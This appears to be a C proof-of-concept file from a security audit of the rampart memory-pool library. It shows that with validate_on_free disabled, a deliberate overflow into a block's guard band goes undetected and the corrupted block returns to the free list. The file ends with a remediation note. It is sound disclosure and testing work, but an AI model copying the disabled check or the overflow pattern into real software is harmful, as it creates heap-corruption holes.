/**
 * @file poc_13_validation_bypass.c
 * @brief PoC for VULN-013: Optional Guard Validation Bypass
 *
 * VULNERABILITY: validate_on_free can be disabled, allowing corrupted
 *                blocks to be freed and returned to the pool.
 *
 * CVSS 3.1: 6.3 (Medium)
 * CWE-754: Improper Check for Unusual or Exceptional Conditions
 *
 * LOCATION: src/rampart.c:363-370
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "rampart.h"

int main(void) {
    rampart_config_t config;
    rampart_pool_t *pool;
    char *block;
    rampart_error_t err;

    printf("=== VULN-013: Optional Guard Validation Bypass ===\n\n");

    /* Create pool with validation DISABLED */
    rampart_config_default(&config);
    config.pool_size = 64 * 1024;
    config.validate_on_free = 0;  /* Disabled! */

    pool = rampart_init(&config);
    if (pool == NULL) {
        printf("[!] Pool creation failed\n");
        return 1;
    }

    printf("[*] Pool created with validate_on_free=0\n");

    block = (char *)rampart_alloc(pool, 64);
    printf("[*] Allocated 64 bytes at: %p\n", (void *)block);

    /* Corrupt the guard band */
    printf("[*] Corrupting rear guard band...\n");
    memset(block, 'X', 64 + 16);  /* Overflow into rear guard */

    /* Free with validation disabled */
    printf("[*] Freeing corrupted block...\n");
    err = rampart_free(pool, block);

    printf("[*] rampart_free returned: %s\n", rampart_error_string(err));

    if (err == RAMPART_OK) {
        printf("\n[VULNERABLE] Corrupted block freed successfully!\n");
        printf("[!] Guard corruption went UNDETECTED.\n");
        printf("[!] Corrupted block is now in free list.\n");
        printf("[!] Next allocation may return corrupted memory.\n");
    }

    rampart_shutdown(pool);

    printf("\n=== Security Implication ===\n");
    printf("With validate_on_free=0:\n");
    printf("  - Buffer overflows silently corrupt heap\n");
    printf("  - Corruption persists to next allocation\n");
    printf("  - Exploitation becomes easier\n");
    printf("\nRemediation: Always validate, or warn loudly when disabled.\n");

    return 0;
}
